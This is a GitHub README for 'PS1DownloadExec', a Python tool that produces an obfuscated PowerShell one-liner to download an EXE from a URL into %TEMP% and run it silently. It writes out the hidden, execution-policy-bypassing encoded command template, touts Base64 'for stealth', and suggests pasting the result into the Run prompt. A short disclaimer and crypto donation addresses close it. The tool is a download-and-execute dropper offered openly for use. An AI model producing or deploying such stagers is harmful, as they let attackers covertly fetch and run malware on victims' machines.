# PS1DownloadExec

> ⚡ Generate a one-liner obfuscated PowerShell command that downloads and executes EXE files — made by [the570j](https://github.com/the570j)

## 💻 What It Does

This Python script creates a PowerShell command that:

- Downloads an `.exe` file from a given URL
- Saves it to the system's `%TEMP%` directory
- Executes it silently
- Encodes everything in Base64 for stealth and convenience

The result is a single-line payload that can be used in:
- `Win + R` (Run prompt)
- CMD / PowerShell terminals
- Batch or shortcut scripts

## 🧪 Example Usage

If the EXE URL is:

https://github.com/the570j/test/raw/refs/heads/main/main.exe


It will output:

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <base64>


Just copy and paste it into `Win + R` or a terminal.

## 🛠 Requirements

- Python 3.x

Install dependencies (none required other than standard Python):

```bash
python ps1gen.py

📁 Files

    ps1gen.py — main script

💸 Donate

If you like this tool, consider donating to support future projects:

    Solana (SOL):

41w1tuNRkw9fmrcLXntQZ8PsaMEeg9weofRvUk5NgmMN

Ethereum (ETH):

0x5D6029cC4339d7Fc811F9c1A1b0aAefA66347f2D

Bitcoin (BTC):

    bc1pynjsln94mmnthcfhwfmwce390hv5xngw90g58nne8cvmxwjqnpzscca7xl

⚠️ Disclaimer

This tool is for educational and authorized use only. Do not use it to download or run unauthorized content. The author is not responsible for any misuse.
